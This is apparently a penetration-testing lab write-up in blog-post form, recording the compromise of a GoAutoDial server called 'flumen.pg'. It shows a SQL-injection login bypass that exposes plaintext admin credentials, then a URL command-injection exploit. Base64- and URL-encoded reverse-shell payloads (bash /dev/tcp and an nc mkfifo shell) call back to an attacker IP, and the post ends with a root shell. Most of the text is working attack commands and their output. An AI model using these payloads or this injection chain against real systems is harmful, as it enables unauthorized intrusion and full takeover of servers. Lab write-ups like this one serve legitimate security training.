---
layout: post
title: "MCO: 11"
tags: pg mco
---

https://flumen.pg/dashboard
```
'OR '1'='1
```

```
  agent019 	  goautodial 	  ACTIVE 	  AGENTS
  Admin 	  ruAWYPLCPcK3dZ3P 	  ACTIVE 	  ADMIN
```

heh...
```
https://flumen.pg/audiostore
```
```
ERROR: sounds_list USER DOES NOT HAVE PERMISSION TO VIEW SOUNDS LIST: |admin|0| 
```

`https://www.exploit-db.com/exploits/36807`
```
echo -n "bash -i >& /dev/tcp/172.16.10.206/4444 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuMTAuMjA2LzQ0NDQgMD4mMQ==
```
```
|| bash -c "eval \`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuMTAuMjA2LzQ0NDQgMD4mMQ== | base64 --decode\`"
```
didn't get a shell back.


tried uploading php file while adding new survey campaign at `https://flumen.pg/campaigns`
```
Error uploading C:\fakepath\wow.wav.php.<br />Please upload only audio files.<br />We strongly recommend <strong>.WAV</strong> files.
```

try the cmd injection thing again, with ping as poc: `ping -c 1 172.16.10.232`
```
echo 'ping -c 1 172.16.10.232' | base64
cGluZyAtYyAxIDE3Mi4xNi4xMC4yMzIK
```
```
index.php/go_site/cpanel/|| bash -c "eval \`echo cGluZyAtYyAxIDE3Mi4xNi4xMC4yMzIK | base64 --decode\`"
```

that didn't work, but this did, holy shit.
```
https://flumen.pg/index.php/go_site/cpanel/||%20bash%20-c%20%22ping%20-c%201%20172.16.10.232%22
```
```
sudo tcpdump ip proto \\icmp -i tap0
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tap0, link-type EN10MB (Ethernet), capture size 262144 bytes
19:14:59.311138 IP flumen.pg > 172.16.10.232: ICMP echo request, id 14620, seq 1, length 64
19:14:59.311178 IP 172.16.10.232 > flumen.pg: ICMP echo reply, id 14620, seq 1, length 64
```

prep rev-shell string:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.16.10.232 4444 >/tmp/f
```
that didn't work; the ';' broke the command injection prematurely

```
bash -i >& /dev/tcp/172.16.10.232/4444 0>&1
```

need the base64 to overcome spaces and other breaks.

confirmed 'nc' back works:
`https://flumen.pg/index.php/go_site/cpanel/||%20bash%20-c%20%22nc%20-nv%20172.16.10.232%204444%22`
```
sudo nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.16.10.232] from (UNKNOWN) [172.16.10.11] 54925
```

try locally:
```
echo "nc -nv 172.16.10.232 4444" | base64 -w0
bmMgLW52IDE3Mi4xNi4xMC4yMzIgNDQ0NAo=
```

this is how it works with eval:
```
eval `echo bmMgLW52IDE3Mi4xNi4xMC4yMzIgNDQ0NAo= | base64 --decode`
(UNKNOWN) [172.16.10.232] 4444 (?) open
```

turn rev-shell string to base64:
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.16.10.232 4444 >/tmp/f" | base64 -w0
cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTcyLjE2LjEwLjIzMiA0NDQ0ID4vdG1wL2YK
```

eval it:
```
eval `echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTcyLjE2LjEwLjIzMiA0NDQ0ID4vdG1wL2YK | base64 --decode`
rm: cannot remove '/tmp/f': No such file or directory
```
it works locally.

boom.
```
https://flumen.pg/index.php/go_site/cpanel/||%20bash%20-c%20%22eval%20%60echo%20cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTcyLjE2LjEwLjIzMiA0NDQ0ID4vdG1wL2YK%20|%20base64%20--decode%60%22
```
```
sudo nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.16.10.232] from (UNKNOWN) [172.16.10.11] 54943
sh: no job control in this shell
sh-3.2# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

### hashed